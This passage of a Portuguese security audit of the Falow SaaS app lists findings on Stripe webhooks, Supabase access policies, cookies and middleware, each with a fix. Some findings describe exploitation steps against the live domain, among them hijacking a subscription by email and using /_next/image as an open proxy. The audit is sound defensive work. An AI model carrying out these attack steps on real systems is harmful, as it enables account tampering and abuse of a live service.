**Verificação:** refute: confirmed (info) / exploit: confirmed (low) / impact: confirmed (low)

### A0-019 [low] Idempotência do webhook da Stripe não cobre entregas simultâneas: stripe_events só é gravado após processar e a leitura de dedup ignora erro
`src/app/api/webhooks/stripe/route.ts:39` · webhook · ✅ confirmado (3 lentes)

**O que é:** A janela entre o `select` (linha 39) e o `insert` (linha 53) permite que duas entregas do mesmo evento (retry da Stripe após timeout enquanto a primeira ainda roda no Worker, ou 'Resend' manual no dashboard) processem o mesmo evento em paralelo. Para checkout de e-mail novo, as duas chamadas acham `findUserIdByEmail` nulo e as duas chamam `inviteUser`: a segunda falha com 'usuário já registrado' → 500 → nova retentativa (que então acha o usuário). O resultado converge, mas gera e-mail/erro duplicado e ruído de falha no endpoint. Além disso, o erro do `select` de dedup é descartado (`const { data: seen }`), então uma falha transitória do banco faz o evento ser reprocessado, e o erro do `insert` final também é ignorado (evento processado mas nunca marcado). A tabela stripe_events também cresce sem limpeza.

**Como acontece:** Stripe entrega evt_X; o Worker demora (retrieveSubscription + convite SMTP) além do timeout da Stripe; a Stripe reenvia evt_X enquanto a primeira ainda executa; ambas passam pelo `select` vazio e chamam handleStripeEvent.

**Evidência:** const { data: seen } = await admin.from("stripe_events").select("id").eq("id", event.id).maybeSingle(); if (seen) return ...; try { const result = await handleStripeEvent(...) } ... await admin.from("stripe_events").insert({ id: event.id });

**Recomendação:** Inserir o evento ANTES de processar (insert com `id` PK; violação de unicidade = duplicado) e, em caso de retry/erro, apagar a linha ou gravar um status ('processing'/'done') na própria tabela. Tratar o erro da leitura/escrita de dedup como 500 (retry) em vez de ignorar. Agendar limpeza de stripe_events com mais de 30 dias (a Stripe não reentrega depois disso).

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-026 [low] Página /assinatura/obrigado promete e-mail que não é enviado quando o e-mail da compra já tem conta
`src/app/assinatura/obrigado/page.tsx:14` · bug · ✅ confirmado (3 lentes)

**O que é:** Quando `findUserIdByEmail` acha um usuário, o webhook não chama `inviteUser` e nenhum e-mail sai. Isso acontece em toda reativação feita pela landing sem login e em compras com e-mail de conta de cortesia. A página pós-compra diz 'Mandamos um e-mail ... com o link para você definir sua senha', e o cliente fica esperando um e-mail que nunca chega.

**Como acontece:** Cliente cancelado, deslogado, clica 'Assinar o Falow' na landing com o mesmo e-mail → paga → sem convite → lê 'confira também o spam' e abre chamado de suporte.

**Evidência:** Mandamos um e-mail para o endereço da compra com o link para você definir sua senha.

**Recomendação:** Na página de obrigado, explicar os dois casos ('se você já tem conta, basta entrar; senão, chega um e-mail'), ou passar `?session_id={CHECKOUT_SESSION_ID}` no success_url e decidir a mensagem consultando a sessão.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-034 [low] Corrida entre admins em writeWithAudit: cortesia pode sobrescrever um bloqueio recém-aplicado (guard lido de estado velho)
`src/lib/admin/grants.ts:66` · bug · ✅ confirmado (3 lentes)

**O que é:** writeWithAudit lê a linha atual (currentGrant), avalia o guard em memória e só depois faz o upsert com onConflict user_id. Nada no banco garante que o estado não mudou entre a leitura e a escrita. A PK em user_id garante no máximo uma linha, mas não protege a regra 'bloqueio vence cortesia'. O restore() em caso de falha de auditoria também regrava o `previous` lido antes, podendo desfazer a escrita concorrente de outro admin.

**Como acontece:** Admin A abre 'Dar cortesia' para o cliente X; admin B clica 'Bloquear' no mesmo cliente. Ordem: A lê previous=null → B lê previous=null → B faz upsert kind='block' + audita → A faz upsert kind='courtesy' (sobrescreve o bloqueio) + audita. Resultado: cliente bloqueado por abuso fica com cortesia ativa; o registro mostra 'block' seguido de 'courtesy_grant' sem nenhum erro para A.

**Evidência:** grants.ts:66-73: `const { grant: previous } = await currentGrant(admin, targetUserId); ... const guardError = guard?.(previous); ... const { error } = await change();` — leitura e escrita separadas; :48 `admin.from("access_grants").upsert(previous, { onConflict: "user_id" })` no restore.

**Recomendação:** Fazer a escrita condicional no banco: função SQL (security definer, só service_role) que faz `insert ... on conflict (user_id) do update set ... where access_grants.kind <> 'block'` e devolve se afetou linha, ou um `update ... eq('user_id').neq('kind','block')` seguido de insert quando não existir. Alternativa: coluna `version` e update com `.eq('version', previous.version)`. No restore, só regravar se a linha atual ainda for a que a ação escreveu.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-023 [low] Acesso não tem teto pelo `current_period_end`: se o webhook parar, assinaturas canceladas mantêm acesso indefinidamente
`src/lib/billing/access.ts:112` · reliability · ✅ confirmado (3 lentes)

**O que é:** hasActiveAccess só olha `status`. Se o endpoint da Stripe for desativado (a Stripe desativa endpoints com falhas persistentes), o `STRIPE_WEBHOOK_SECRET` for trocado sem atualizar o secret, ou o Worker ficar fora por mais de 3 dias (janela de retentativa), os eventos de cancelamento/inadimplência se perdem e todo mundo fica `active` para sempre, sem nenhum sinal no app. A coluna `current_period_end` já é gravada e poderia servir de rede de segurança.

**Como acontece:** Secret do webhook rotacionado no dashboard sem `wrangler secret put` → toda entrega responde 400 → após 3 dias a Stripe para de reenviar → clientes que cancelaram continuam com acesso e o bot segue respondendo.

**Evidência:** return isAccessStatus((data as { status?: string } | null)?.status);

**Recomendação:** Negar acesso quando `current_period_end` estiver mais de N dias (ex.: 7, cobrindo o ciclo de retentativas do past_due) no passado, e registrar um alerta. Monitorar na Stripe (Developers → Webhooks) a taxa de erro do endpoint.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-032 [low] FALOW_OWNER_USER_ID comparado de forma case-sensitive (isOwner e adminIds sem normalizar): dono em maiúsculas deixa de ser dono/admin e perde a proteção contra bloqueio
`src/lib/billing/access.ts:21` · bug · ✅ confirmado (3 lentes)

**O que é:** `isOwner` faz `userId === owner` com o valor bruto (só trim) de FALOW_OWNER_USER_ID, e `adminIds()` adiciona o dono cru (`ids.add(owner)`, linha 39), enquanto os UUIDs de FALOW_ADMIN_USER_IDS são normalizados com `toLowerCase()` (linha 47) e `isAdmin` compara com `userId.toLowerCase()` (linha 58). O dono também não passa pela validação UUID_RE que a lista passa. O Supabase devolve UUIDs em minúsculas; um UUID copiado em maiúsculas (ou com caixa mista, como alguns clientes de banco exibem) ou com erro de digitação faz o dono deixar de ser dono sem nenhum aviso (isOwner é sempre false e a entrada do dono no Set nunca casa), enquanto um admin na mesma situação continua funcionando. O purge se apoia em isOwner/isAdmin para 'nunca apagar o dono' (src/lib/billing/purge.ts:17-19).

**Como acontece:** FALOW_OWNER_USER_ID cadastrado como `8F2C...` (maiúsculas). Efeitos: o dono abre /sistema/dashboard e é mandado para /assinatura ('Sem assinatura'), /admin vira 404 para ele; outro admin da lista consegue bloquear o dono ou dar cortesia a ele pelo painel (isAdmin(target) falha, ADMIN_TARGET_ERROR não dispara); no purge, isAdmin(row.user_id) deixa de proteger e só o `.neq('user_id', owner)` do Postgres (que normaliza uuid) evita a exclusão. O diagnóstico é difícil porque isAdmin não loga nada nesse caso.

**Evidência:** src/lib/billing/access.ts:20-21 `const owner = process.env.FALOW_OWNER_USER_ID?.trim(); return Boolean(owner && userId && userId === owner);` ; :39 `if (owner) ids.add(owner);` ; :47 `ids.add(id.toLowerCase());` ; :58 `return adminIds().has(userId.toLowerCase());`

**Recomendação:** Normalizar o dono com `trim().toLowerCase()` em isOwner e em adminIds(), validar com a mesma UUID_RE usada para os admins e logar erro (uma vez por configuração) se o valor não for UUID; comparar sempre em minúsculas. Adicionar teste em access.test.ts com o dono em maiúsculas.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-022 [low] Reativação com assinatura `incomplete` abre segunda assinatura no mesmo customer (cobrança em dobro silenciosa)
`src/lib/billing/checkout.ts:13` · bug · ✅ confirmado (3 lentes)

**O que é:** Qualquer status sem acesso (inclusive `incomplete`, pagamento pendente de 3DS, ou `past_due` após perder acesso) leva a um novo Checkout com `customer: stripe_customer_id`. A Stripe permite várias assinaturas por customer; se a primeira (incomplete) for confirmada depois, o cliente paga duas vezes, e os eventos dela passam a ser ignorados pelo webhook (linha 219 de stripe-events.ts), ficando invisível no painel.

**Como acontece:** Cliente reativa, 3DS fica pendente → linha incomplete (sub_1) → /assinatura mostra 'Reativar' → novo checkout com customer=cus_1 → sub_2 active; banco confirma sub_1 depois → duas assinaturas ativas no mesmo customer, só sub_2 no banco.

**Evidência:** if (input.subscription) return { kind: "checkout", customer: input.subscription.stripe_customer_id };

**Recomendação:** Antes de abrir o Checkout para um customer existente, listar as assinaturas dele na Stripe (`subscriptions.list({ customer, status: 'all' })`) e, se houver uma `incomplete`/`past_due`/`active`, mandar para o portal (pagar a fatura pendente) em vez de criar outra. Alternativamente, não oferecer 'Reativar' enquanto o status for `incomplete`.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-008 [low] Vínculo de assinatura por e-mail não verificado: terceiro pode ligar um cliente Stripe a qualquer conta existente sem acesso
`src/lib/billing/stripe-events.ts:167` · security · ✅ confirmado (3 lentes)

**O que é:** No checkout.session.completed, quando o cliente Stripe é novo, o usuário é resolvido só pelo e-mail digitado no Checkout (`session.customer_details.email`), que a Stripe não verifica. O código só se protege quando a linha existente já tem acesso (linha 167). Se a conta-alvo não tem linha (cortesia, admin) ou está sem acesso (canceled, unpaid, incomplete, paused), o upsert (linha 175) troca `stripe_customer_id`/`stripe_subscription_id` da vítima pelos do atacante. A partir daí: (a) eventos da assinatura real da vítima passam a ser ignorados (linha 219, id diferente); (b) o botão 'Gerenciar na Stripe' e o 'Reativar' da vítima passam a operar o customer do atacante (checkout.ts reaproveita `stripe_customer_id`), então o cartão da vítima é anexado a um customer criado por outra pessoa; (c) quando a assinatura do atacante cai (cartão pré-pago, chargeback), o `deleted` marca a vítima como canceled e agenda o purge dos dados dela em 30 dias. O checkout da rota logada também não carrega `client_reference_id`/metadata com o user_id, então mesmo um comprador logado é resolvido por e-mail.

**Como acontece:** Atacante anônimo abre falow.app.br/sistema → 'Assinar o Falow' → no Checkout da Stripe digita o e-mail de um cliente que está canceled/incomplete/paused ou de um usuário de cortesia → paga → webhook acha o user_id pelo e-mail (falow_user_id_by_email), `prev` sem acesso → upsert religa a linha ao cus/sub do atacante.

**Evidência:** const email = session.customer_details?.email ?? session.customer_email ?? null; ... userId = (await deps.findUserIdByEmail(email)) ?? (await deps.inviteUser(email)); ... if (prev && isAccessStatus(prev.status) && prev.stripe_subscription_id !== subscriptionId) { ...return processed } ... upsert({ user_id: userId, stripe_customer_id: customerId, ... })

**Recomendação:** Na rota /api/billing/checkout, quando houver usuário logado, enviar `client_reference_id: user.id` (ou `subscription_data.metadata.user_id`) e no webhook priorizar esse id sobre o e-mail. Para compra anônima com e-mail de conta já existente, não religar a linha automaticamente: ou exigir que o usuário esteja logado para reativar (o botão da landing redireciona para login quando o e-mail já existe), ou deixar a linha intacta e registrar para tratamento manual, como já é feito para quem tem acesso. Considerar também só aceitar religação quando `prev.stripe_customer_id` for igual ao customer da sessão.

**Verificação:** refute: confirmed (low) / exploit: confirmed (medium) / impact: confirmed (low)

### A0-021 [low] Assinatura criada fora do Checkout (dashboard da Stripe) nunca entra: created/updated de id diferente é ignorado e de cliente desconhecido dá 500 por 3 dias
`src/lib/billing/stripe-events.ts:219` · webhook · ✅ confirmado (3 lentes)

**O que é:** handleSubscription só grava se a linha já tem o mesmo `stripe_subscription_id` (ou nulo). Uma assinatura criada manualmente no dashboard da Stripe para um cliente cancelado (operação comum para cobrar por outro meio ou dar meses grátis) chega como customer.subscription.created com id novo → `ignored` para sempre, e o cliente fica sem acesso mesmo pagando. Para um customer que não existe em `subscriptions` (criado no dashboard, ou cujo usuário já foi apagado pelo purge, ou o cliente da 'compra repetida' ignorada na linha 171), a rota responde 500 em toda entrega e a Stripe reenvia por até 3 dias; isso conta como falha do endpoint nas métricas da Stripe.

**Como acontece:** Operador cria assinatura no dashboard para cus_1 (linha canceled com sub_velha) → evento created(sub_nova) → row.stripe_subscription_id !== sub.id → ignored; cliente continua canceled e é purgado em 30 dias.

**Evidência:** if (!row) return { status: "retry", reason: "cliente ainda desconhecido" }; if (row.stripe_subscription_id && row.stripe_subscription_id !== sub.id) return { status: "ignored" };

**Recomendação:** Em created/updated com id diferente, aceitar a nova assinatura quando a linha estiver sem acesso (status não em ACCESS_STATUSES), mantendo o bloqueio só para quem já tem acesso. Para cliente desconhecido em `customer.subscription.created`, resolver o usuário pelo e-mail do customer (customers.retrieve) em vez de devolver 500; e responder 200 'ignored' quando o customer não existe mais (após purge), registrando no log.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-016 [low] Tabela processed_events cresce sem limite (nenhum purge) e recebe mids de contas desconhecidas
`src/lib/meta/process.ts:234` · optimization · ✅ confirmado (3 lentes)

**O que é:** `processed_events` (migration 0001 l.106-109: `mid text primary key, created_at`) só recebe inserts; nenhum código em `src/` apaga linhas (grep: só os 4 inserts em process.ts) e o cron de purge (api/cron/purge/route.ts) não a toca. Além disso o insert acontece ANTES de `findServedAccount` (l.234-243), então mids de contas desconectadas, sem assinatura ou que nem existem no Falow também são gravados. Com reação/visto/edição não passando por aqui, o volume é 1 linha por DM/postback/comentário recebido por qualquer conta inscrita no app, para sempre.

**Como acontece:** Custo: índice PK crescendo indefinidamente, cada webhook faz um insert que precisa checar unicidade num índice cada vez maior; armazenamento do Supabase consumido por dados sem utilidade após alguns dias (a Meta não reentrega eventos antigos). Ganho: purge diário de `created_at < now() - 7 dias` mantém a tabela pequena e o insert barato.

**Evidência:** supabase/migrations/0001_init.sql l.106-109 e ausência de `delete` em `processed_events` no código; process.ts l.234-239 insert antes de l.243 `findServedAccount`.

**Recomendação:** Acrescentar ao cron de purge (06:00 UTC) um `delete from processed_events where created_at < now() - interval '7 days'` (com índice em `created_at`), e considerar inserir o dedupe só depois de resolver a conta atendida.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-017 [low] Consultas repetidas por evento: ~10-12 round trips ao Supabase antes de qualquer resposta
`src/lib/meta/process.ts:243` · optimization · ✅ confirmado (3 lentes)

**O que é:** Para cada evento `messaging[]` de uma DM comum o pipeline faz, em sequência: insert `processed_events` (l.235); `findServedAccount` = `ig_accounts` + `access_grants` + `subscriptions` (served-account.ts l.14-21, access.ts l.97-106); `touchConversation` = upsert + 2 updates (l.125-142); `isTakenOver` (l.254); `handleSequenceReply` select em `sequence_runs` (runtime.ts l.413-421); `automationPausedUntil` (l.295); select `rules` (l.328); select `rule_triggers` (l.455); e, em paralelo, o CRM repete `ig_accounts` (record.ts l.24), `conversations` (leadNeedsProfile), upsert `conversations` (ensureConversation), insert `messages`, `pipelines`, `leads`... Nada disso é cacheado entre os eventos de um mesmo `entry` (mesma conta) nem entre os dois caminhos (automação e CRM) do mesmo evento. `isTakenOver` e `automationPausedUntil` leem a mesma linha de `conversations` em duas consultas separadas.

**Como acontece:** Custo real: latência acumulada de 10-12 idas ao Postgres por DM (cada uma ~20-80ms do Worker ao Supabase) antes da pausa humanizada, multiplicada por evento num lote; ganho: resolver a conta uma vez por `entry` e ler `conversations` uma vez (`human_takeover_at`, `automation_paused_until`, `last_inbound_at`) corta metade das consultas.

**Evidência:** process.ts l.243 `findServedAccount` chamado por evento; record.ts l.34 `findAccount` de novo no CRM para o mesmo `igBusinessId`; l.254 e l.295 duas consultas a `conversations` pela mesma chave.

**Recomendação:** Resolver `account` uma vez em `processWebhookPayload` por `entry.id` e passar para os eventos e para o CRM; unificar a leitura de `conversations` (takeover + pausa + janela) numa consulta; trocar os 3 comandos de `touchConversation` por um upsert com `last_inbound_at = greatest(...)` via RPC.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (info)

### A0-027 [low] Cookies de sessão sem flag Secure e com path '/', fora do basePath /sistema (vazam para a landing no mesmo hostname)
`src/lib/supabase/server.ts:10` · security · ✅ confirmado (3 lentes)

**O que é:** createServerClient (server.ts:10-30), o middleware (middleware.ts:19-38) e createBrowserClient (client.ts:9-12) não passam `cookieOptions`, então valem os padrões do @supabase/ssr 0.6.1: `path: '/'`, `sameSite: 'lax'`, sem `secure`. Com basePath /sistema, o cookie `sb-<ref>-auth-token` (contém access e refresh token) é enviado também para https://falow.app.br/ (a landing, outro projeto Cloudflare Pages conforme docs/operacao-saas.md:21,136) e para qualquer caminho futuro do hostname. Sem `Secure`, o navegador manda o cookie numa requisição http://falow.app.br/sistema/... se algo (link, rede hostil) forçar HTTP e 'Always Use HTTPS'/HSTS não estiverem ligados na zona (a confirmar na configuração). O cookie `meta_oauth_state` (src/app/api/auth/meta/route.ts:26-32) tem `secure` mas também usa `path: '/'`.

**Como acontece:** Atacante em rede local induz o navegador da vítima a abrir http://falow.app.br/sistema/dashboard (ex.: portal cativo); se a zona não redirecionar antes de o cookie sair, o token de sessão trafega em claro. Independente disso, todo acesso à landing (inclusive analytics ou functions que ela tenha) recebe o token da sessão do painel no header Cookie.

**Evidência:** node_modules/@supabase/ssr/dist/main/utils/constants.js:4-10 `DEFAULT_COOKIE_OPTIONS = { path: "/", sameSite: "lax", httpOnly: false, maxAge: 400 dias }` (sem secure); src/lib/supabase/server.ts:10-30 e src/middleware.ts:19-38 sem `cookieOptions`.

**Recomendação:** Passar `cookieOptions: { path: '/sistema', secure: true, sameSite: 'lax' }` nos três clients (server, middleware e browser; o mesmo valor em todos, senão o browser e o servidor gravam cookies diferentes) e `path: '/sistema'` no meta_oauth_state. Confirmar na Cloudflare 'Always Use HTTPS' e HSTS.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-028 [low] Redirect e rewrite do middleware descartam os cookies renovados pelo getUser()
`src/middleware.ts:53` · bug · ✅ confirmado (3 lentes)

**O que é:** O cliente Supabase do middleware grava os cookies renovados em `response` (setAll, linhas 27-35). Nos caminhos que retornam `NextResponse.rewrite(url, { status: 404 })` (linha 53) ou `NextResponse.redirect(url)` (linha 61), um objeto novo é devolvido sem copiar `response.cookies`. Se justamente nessa requisição o access token tinha expirado e getUser() rotacionou o refresh token, a rotação não chega ao navegador: ele continua com o refresh token antigo, já consumido. O Supabase tolera o reuso dentro do 'refresh token reuse interval' (10 s por padrão), então na prática a próxima requisição costuma salvar a situação, mas fora dessa janela (aba parada, retry lento) a sessão cai com 'Invalid Refresh Token' e o usuário é deslogado sem motivo. O próprio guia do @supabase/ssr avisa para copiar os cookies ao criar uma resposta nova.

**Como acontece:** Usuário sem acesso com token expirado abre /sistema/dashboard → middleware renova a sessão e redireciona para /assinatura sem os cookies novos → o navegador reenvia o refresh token antigo; se o intervalo de reuso já passou (ou o admin reduziu para 0), a próxima getUser() falha e ele é mandado para /login. Mesmo cenário para usuário logado que abre /login (redirect para /dashboard) e para não-admin que abre /admin (rewrite 404).

**Evidência:** src/middleware.ts:51-53 `const url = request.nextUrl.clone(); url.pathname = "/404"; return NextResponse.rewrite(url, { status: 404 });` e :58-61 `return NextResponse.redirect(url);` sem `response.cookies.getAll().forEach(c => novo.cookies.set(c))`.

**Recomendação:** Antes de devolver o redirect/rewrite, copiar `response.cookies.getAll()` para a resposta nova (padrão da documentação do Supabase para Next), ou criar o redirect e só então rodar o setAll nele.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-029 [low] Middleware faz três chamadas de rede sequenciais ao Supabase em toda requisição (inclusive prefetch RSC e POST de actions) e o layout repete a primeira
`src/middleware.ts:43` · optimization · ✅ confirmado (3 lentes)

**O que é:** Para cada requisição casada pelo matcher (navegação, prefetch de cada `<Link>` visível, POST de server action, requisições RSC), o middleware chama `supabase.auth.getUser()` (HTTPS até /auth/v1/user do Supabase), depois `access_grants` e depois `subscriptions` (hasActiveAccess, access.ts:97-112), em série. Em seguida o layout do painel chama getUser() de novo (layout.tsx:18) e as páginas fazem suas consultas. Do Worker (edge) até a região do Supabase isso soma três a quatro idas e voltas (tipicamente 150-400 ms) antes de qualquer render, multiplicadas pelos prefetches da sidebar. A conta também pesa no limite de requisições/CPU do Worker e no Supabase.

**Como acontece:** Usuário abre /dashboard: 1 navegação + ~8 prefetches de links da sidebar = ~9 passagens pelo middleware = ~27 chamadas ao Supabase só para decidir acesso, mais a repetição de getUser no layout. Em pico de clientes, o custo cresce linearmente e a latência percebida do painel fica dominada por essas chamadas.

**Evidência:** src/middleware.ts:41-47 `await supabase.auth.getUser()` seguido de `await hasActiveAccess(supabase, user.id)`; src/lib/billing/access.ts:97-106 duas consultas em série; src/app/(dashboard)/layout.tsx:16-18 getUser() de novo.

**Recomendação:** Validar o JWT localmente no middleware (getClaims/JWKS do supabase-js recente, sem ida ao Auth) e guardar a decisão de acesso num cookie assinado de curta duração (ex.: 60 s) ou numa única RPC `has_active_access(user_id)` que leia as duas tabelas de uma vez; paralelizar as duas consultas com Promise.all quando a RPC não for possível; pular hasActiveAccess quando o destino é /assinatura (a decisão não depende dele).

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (info)

### A0-015 [low] CRM captura mensagens e usa o token da conta para contas sem assinatura ou bloqueadas
`src/modules/crm/capture/server/record.ts:22` · security · ✅ confirmado (3 lentes)

**O que é:** `findAccount` (record.ts l.22-31), usado por `captureMessagingEvent` (capture-event.ts l.34) e por `observeOutbound`, só exige `status = 'active'`; não passa por `hasActiveAccess` como `findServedAccount` (served-account.ts l.21). Assim, para um cliente com assinatura cancelada ou bloqueado pelo admin (`access_grants.kind = 'block'`), o webhook continua: gravando todas as DMs em `messages`, criando conversas/funil padrão (`ensureDefaultPipeline`, enroll-lead.ts l.21) e chamando a Graph API com o token descriptografado do cliente para buscar o perfil do lead (`refreshLeadProfile`, capture-event.ts l.45 → refresh-profile.ts l.34-35). O comentário de served-account.ts diz que conta sem assinatura = "bot calado, sem log", mas o CRM não segue essa regra.

**Como acontece:** Admin bloqueia o cliente X (ou a assinatura dele vence). Cada DM recebida pela conta de X continua sendo persistida no banco (dados de terceiros retidos para um cliente sem contrato ativo) e cada lead novo gera uma chamada à Graph API em nome de X. Se o bloqueio foi por abuso, o sistema segue agindo com o token dele.

**Evidência:** record.ts l.24-29: `.from("ig_accounts").select("*").eq("ig_user_id", igUserId).eq("status", "active")` sem checagem de acesso; capture-event.ts l.44-45: `if (... await leadNeedsProfile(...)) await refreshLeadProfile(admin, account, message.leadId)`.

**Recomendação:** Decidir a política e aplicá-la nos dois caminhos: ou `findAccount` do CRM também usa `hasActiveAccess` (ou `findServedAccount`), ou pelo menos não chama a Graph API (perfil) e não inscreve no funil quando a conta não tem acesso. Cachear o resultado por entry para não repetir as 3 consultas.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-033 [low] Policy de SELECT em access_grants expõe ao cliente o motivo interno do bloqueio e o UUID do admin
`supabase/migrations/0021_admin_access_grants.sql:24` · security · ✅ confirmado (3 lentes)

**O que é:** A policy 'own access grant select' libera todas as colunas da própria linha (kind, expires_at, reason, granted_by, created_at) para o role authenticated. A tela /assinatura esconde o motivo de propósito (mostra só 'Conta bloqueada. Fale com o suporte.'), mas o cliente não precisa da tela: a API REST do Supabase é pública com a anon key + o JWT dele. O motivo é texto livre do admin (ex.: 'suspeita de fraude', 'chargeback', nome de outro cliente) e granted_by identifica qual admin agiu.

**Como acontece:** Cliente bloqueado (ou com cortesia) pega o access_token do cookie da própria sessão e faz `GET https://<projeto>.supabase.co/rest/v1/access_grants?select=*` com `apikey: <anon>` e `Authorization: Bearer <jwt>` → lê `reason` e `granted_by`. Pode usar o texto em disputa/reclamação ou para engenharia social contra o admin identificado.

**Evidência:** 0021:24-25 `create policy "own access grant select" on public.access_grants for select using (user_id = auth.uid());` (sem restrição de coluna). assinatura/page.tsx:69-74 esconde o motivo na UI, mostrando que a intenção é mantê-lo interno.

**Recomendação:** Restringir colunas: `revoke select on public.access_grants from anon, authenticated; grant select (user_id, kind, expires_at) on public.access_grants to authenticated;` (o middleware e /assinatura só usam kind/expires_at; accessGrantOf faz `select('*')` e precisaria passar a selecionar só essas colunas), ou mover reason/granted_by para uma tabela só do service role.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A2-023 [low] /_next/image funciona como proxy aberto para cdninstagram/fbcdn/graph.facebook.com embora o app não use next/image
`next.config.mjs:11` · security · ⚠️ não verificado

**O que é:** `images.remotePatterns` libera `**.cdninstagram.com`, `**.fbcdn.net` e `graph.facebook.com`, mas nenhum arquivo em src importa `next/image` (grep vazio). No Cloudflare, o OpenNext atende `/_next/image?url=...` com o template images.js: valida a URL contra os remotePatterns, faz fetch com até N redirects e devolve o corpo (sem otimizar). Isso vira um proxy anônimo pago pela sua conta, acessível em https://falow.app.br/sistema/_next/image?url=https://...cdninstagram.com/...&w=64&q=75.

**Como acontece:** Atacante anônimo usa o endpoint para baixar mídia pública do Instagram em massa pelo seu Worker (custo de requisições/egress e contagem contra o limite de subrequests), ou para mascarar a origem de downloads. Também gera tráfego de saída para graph.facebook.com sem token (inofensivo, mas desnecessário).

**Evidência:** node_modules/@opennextjs/cloudflare/dist/cli/templates/images.js:14-52 `handleImageRequest` faz `fetchWithRedirects(parseResult.url, ...)`; compile-images.js:16 injeta os remotePatterns do next.config

**Recomendação:** Definir `images: { unoptimized: true }` e remover `remotePatterns` (nada usa next/image; fotos de perfil são `<img>` normais). Se um dia usar next/image, restringir os padrões a caminhos específicos e aplicar rate limit da Cloudflare em /sistema/_next/image.

### A3-037 [low] /_next/image funciona como proxy anônimo para hosts do Instagram sem o binding IMAGES
`next.config.mjs:12` · security · ⚠️ não verificado

**O que é:** OpenNext roteia `/sistema/_next/image?url=...` para handleImageRequest (template worker.js:36-39); sem `env.IMAGES` no wrangler.toml ele simplesmente busca a URL remota e devolve os bytes (images.js:125-131), limitado pelos remotePatterns `**.cdninstagram.com`, `**.fbcdn.net`, `graph.facebook.com`. Não há autenticação (o middleware ignora /_next/image, src/middleware.ts:69) nem rate limiting.

**Como acontece:** Anônimo usa https://falow.app.br/sistema/_next/image?url=https://scontent.cdninstagram.com/...&w=1080&q=75 em escala como CDN/proxy gratuito para mídia do Instagram: consome invocações, subrequests e banda do Worker da conta e pode disparar o limite de subrequests.

**Evidência:** next.config.mjs:12-16 remotePatterns; wrangler.toml não declara `[images]`; node_modules/@opennextjs/cloudflare/dist/cli/templates/images.js:126-131 `if (env.IMAGES === undefined) { warn(...); return createImageResponse(imageStream, ...)`.

**Recomendação:** Declarar o binding `[images] binding = "IMAGES"` (otimiza e cacheia) e aplicar Cache Rules/rate limiting em `/sistema/_next/image`; alternativamente `images.unoptimized = true` e servir as fotos de perfil direto da URL da Meta.

### A2-037 [low] Higiene de supply chain: sem CI com npm ci/audit, sem engines/.nvmrc, caret em tudo, @types/node 20 com Node 22, @supabase/ssr seis minors atrás e compatibility_date mais nova que o workerd instalado
`package.json:51` · config · ⚠️ não verificado

**O que é:** Vários itens pequenos que, juntos, deixam a árvore de dependências menos previsível: (1) não existe `.github/workflows`, Dependabot/Renovate nem script de auditoria; o lockfile só é respeitado se alguém rodar `npm ci` à mão (o `npm ci --dry-run` passa hoje e o lock está coerente com o package.json, commits 8242408/08d66e3), mas o `node_modules` local já tem pacotes 'extraneous' (`@emnapi/runtime`, `@img/sharp-wasm32`) que mostram instalações fora do lock. (2) Não há `engines` nem `.nvmrc`: o ambiente usa Node 22.22 e `@types/node ^20` (`package.json:51`), e o runtime real é o workerd com `nodejs_compat`, então tipos e runtime divergem silenciosamente. (3) Todas as versões usam `^`; isso não puxa major para `next`/`react`/`stripe`, mas para `@supabase/ssr ^0.6.1` (`package.json:29`) o caret em 0.x prende em 0.6.x enquanto a linha atual é 0.12.7 (correções de cookies chunked/refresh de sessão desde 0.7), e `stripe ^18.5.0` fica 5 majors atrás de 23.x. (4) `wrangler.toml:3` tem `compatibility_date = "2026-09-14"`, mais nova que o workerd instalado (1.20260911.1, suporta até 2026-09-11): `wrangler dev`/`preview:cloudflare` avisam e caem para a data suportada, então o preview local não roda exatamente o runtime de produção. (5) Scripts de install existem só em esbuild (3 cópias), workerd e fsevents, todos dev, sem `ignore-scripts` configurado.

**Como acontece:** Falha operacional, não ataque direto: um `npm install` numa máquina diferente pode resolver versões diferentes das testadas (ou um pacote comprometido dentro do range caret), e um bug de runtime só aparece em produção porque o preview local usa outra compatibility date. A ausência de audit automatizado é o que permitiu o acúmulo de 34 advisories sem ninguém notar.

**Evidência:** ls .github -> não existe; package.json sem `engines`; node -v 22.22.0 vs @types/node 20.19.43; package-lock.json: @supabase/ssr 0.6.1, stripe 18.5.0, workerd 1.20260911.1; wrangler.toml:3; `npm ls` lista `@emnapi/runtime@1.11.3 extraneous` e `@img/sharp-wasm32@0.35.4 extraneous`.

**Recomendação:** Adicionar `engines: { node: ">=22" }` + `.nvmrc`, subir `@types/node` para 22; criar um workflow mínimo (ou hook no deploy) com `npm ci`, `npm run typecheck`, `npm test`, `npm audit --omit=dev --audit-level=high`; configurar Dependabot/Renovate para atualizações semanais; alinhar `compatibility_date` com a data do workerd que o wrangler instalado suporta (ou atualizar wrangler para 4.154.0, que traz workerd mais novo); subir `@supabase/ssr` para 0.12.x testando o fluxo de cookies no middleware; considerar `ignore-scripts=true` no `.npmrc` com allowlist para esbuild/workerd.

### A3-033 [low] @opennextjs/cloudflare 1.14.10 vulnerável (GHSA-c7mq-gh6q-6q7c SSRF via /cdn-cgi, corrigido em 1.17.1; GHSA-2vc4-c4r6-p6v6, corrigido em 1.20.2)
`package.json:47` · config · ⚠️ não verificado

